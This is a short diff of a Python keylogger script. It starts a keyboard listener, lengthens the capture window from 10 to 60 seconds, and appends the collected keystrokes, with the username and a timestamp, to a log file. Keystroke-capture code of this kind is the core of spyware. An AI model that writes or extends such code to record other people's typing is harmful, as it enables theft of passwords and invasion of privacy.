@@ -39,8 +39,7 @@ if __name__ == "__main__":
         log = []
         listener = keyboard.Listener(on_press=on_press)
         listener.start()
-        sleep(10)
+        sleep(60)
         listener.stop()
         log_line = f"{getlogin()} -- {asctime(localtime())}: {''.join(log)}"
         append_line(log_file, log_line)
-        # print(f"{getlogin()} -- {asctime(localtime())}: {''.join(log)}")
